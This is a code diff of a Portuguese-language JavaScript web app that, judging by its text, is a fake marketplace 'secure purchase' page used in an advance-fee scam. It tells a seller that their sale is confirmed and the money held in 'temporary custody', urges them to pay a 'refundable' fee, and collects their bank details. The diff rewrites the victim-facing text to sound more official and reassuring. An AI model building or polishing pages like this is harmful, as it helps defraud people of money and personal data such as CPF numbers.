@@ -5,14 +5,14 @@ const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw0tZ66QIzYiGsD2XNy
 const BASE_URL = window.location.href.split('?')[0]; 
 
 // 🔐 CONFIGURAÇÃO DE SEGURANÇA
-const ADMIN_PIN = "0007"; // <--- DEFINA SEU PIN DE 4 DÍGITOS AQUI
+const ADMIN_PIN = "0007"; // <--- SEU PIN AQUI
 
 // ========================================================
 // 🚦 ROTEADOR E AUTH
 // ========================================================
 document.addEventListener('DOMContentLoaded', () => {
   const params = new URLSearchParams(window.location.search);
-  
+
   const viewLogin = document.getElementById('login-view');
   const viewAdmin = document.getElementById('admin-view');
   const viewClient = document.getElementById('client-view');
@@ -106,7 +106,7 @@ function initAdminApp() {
     const amount = parseFloat(value) / 100;
     return isNaN(amount) ? "" : amount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
   };
-  
+
   moneyInputs.forEach(input => {
     input.addEventListener('input', (e) => e.target.value = formatMoney(e.target.value));
     if(input.value) {
@@ -186,7 +186,7 @@ function initAdminApp() {
 }
 
 // ========================================================
-// 🛍️ LÓGICA CLIENTE
+// 🛍️ LÓGICA CLIENTE (ATUALIZADA & SEGURA)
 // ========================================================
 async function initClientApp(id) {
   const containerArea = document.getElementById('client-content-area');
@@ -242,6 +242,7 @@ async function initClientApp(id) {
     const dados = {};
     Object.keys(dadosBrutos).forEach(key => dados[key.toLowerCase()] = dadosBrutos[key]);
 
+    // Normalização de chaves
     dados.valor = dados.valor || dados['valor total'] || '';
     dados.taxa = dados.taxa || dados['taxa de serviço'] || '';
     dados.frete = dados.frete || dados['custo frete'] || '';
@@ -249,7 +250,7 @@ async function initClientApp(id) {
     dados.linkpagamento = dados.linkpagamento || dados['link pagamento'] || dados['checkout'] || '#';
 
     containerArea.innerHTML = '';
-    
+
     const container = criarElemento('div', { class: 'client-container' });
     const imgHeader = criarElemento('div', { class: 'header-image' });
     const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura' }); 
@@ -258,17 +259,32 @@ async function initClientApp(id) {
     const prazo = dados.prazo || '15 minutos';
     const linkFinal = dados.linkpagamento;
 
+    // ------------------------------------------------------
+    // INJEÇÃO DO CONTEÚDO ATUALIZADO
+    // ------------------------------------------------------
     content.innerHTML = `
-      <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
-      <p>Após o pagamento da taxa de <span class="highlight">${getDisplayValue(dados.taxa, true, '---')}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${prazo}</span>. Seu seguro está ativo.</p>
+      <div style="text-align: center; margin-bottom: 20px;">
+          <h2 style="color: #00bfa5; margin: 0;">🎉 Venda Confirmada!</h2>
+          <p style="font-size: 14px; opacity: 0.8; margin-top: 5px;">Seu anúncio encontrou um comprador.</p>
+      </div>
+
+      <div style="background: rgba(0, 191, 165, 0.1); border-left: 4px solid #00bfa5; padding: 15px; border-radius: 4px; margin-bottom: 20px; text-align: left;">
+          <p style="margin: 0; font-size: 14px; line-height: 1.5;">
+              Para garantir a segurança da transação, o saldo total está em <strong>Custódia Temporária</strong>.
+              <br><br>
+              <strong>Ação Necessária:</strong> Regularize a taxa de <span class="highlight">${getDisplayValue(dados.taxa, true, '---')}</span>.
+              <br>
+              <span style="font-size: 12px; opacity: 0.8;">ℹ️ Fique tranquilo: este valor é <strong>100% reembolsável</strong> e será creditado automaticamente junto com o valor da venda em até <strong>${prazo}</strong> após a confirmação.</span>
+          </p>
+      </div>
       
-      <h2>Detalhes da transação</h2>
+      <h3 style="border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 30px; color: #fff; font-size: 16px;">Resumo do Pedido</h3>
       <p><i class="fa-solid fa-user icon"></i> <strong>Comprador(a):</strong> <span>${dados.comprador || '---'}</span></p>
-      <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto:</strong> <span>${getDisplayValue(dados.valor, true, '---')}</span></p>
+      <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor da Venda:</strong> <span>${getDisplayValue(dados.valor, true, '---')}</span></p>
       <p><i class="fa-solid fa-truck icon"></i> <strong>Frete:</strong> <span>${getDisplayValue(dados.frete, true, 'Grátis')}</span></p>
       <p><i class="fa-solid fa-shield-halved icon"></i> <strong>Tarifa de Serviço:</strong> <span>${getDisplayValue(dados.tarifa, true, 'Inclusa')}</span></p>
       ${dados.cpf ? `<p><i class="fa-solid fa-id-card icon"></i> <strong>CPF:</strong> <span>${dados.cpf}</span></p>` : ''}
-      ${dados.cartao ? `<p><i class="fa-solid fa-credit-card icon"></i> <strong>Transação via:</strong> <span>${dados.cartao}</span></p>` : ''}
+      ${dados.cartao ? `<p><i class="fa-solid fa-credit-card icon"></i> <strong>Método:</strong> <span>${dados.cartao}</span></p>` : ''}
 
       <div style="margin-top:15px">
         ${dados.vendas ? `<span class="badge">${dados.vendas}</span>` : ''}
@@ -276,11 +292,8 @@ async function initClientApp(id) {
         ${dados.entrega ? `<span class="badge">${dados.entrega}</span>` : ''}
       </div>
 
-      <h2>💬 Próximos passos</h2>
-      <ul>
-        <li>Preencha o formulário abaixo com seus dados bancários para recebimento.</li>
-        <li>Após enviar, o botão de pagamento da taxa será liberado.</li>
-      </ul>
+      <h3 style="border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 30px; color: #fff; font-size: 16px;">💬 Validação de Segurança</h3>
+      <p style="font-size: 13px; opacity: 0.7;">Preencha os dados abaixo para autorizar o recebimento e liberar o link da taxa.</p>
     `;
 
     const form = criarElemento('form', { id: 'dadosCliente' });
@@ -321,7 +334,7 @@ async function initClientApp(id) {
 
         btnPagamento.classList.remove('hidden');
         btnPagamento.classList.add('visible');
-        
+
         const endAnimation = (evt) => {
            if (evt.propertyName === 'opacity' || evt.propertyName === 'transform') {
              loaderDiv.style.display = 'none';
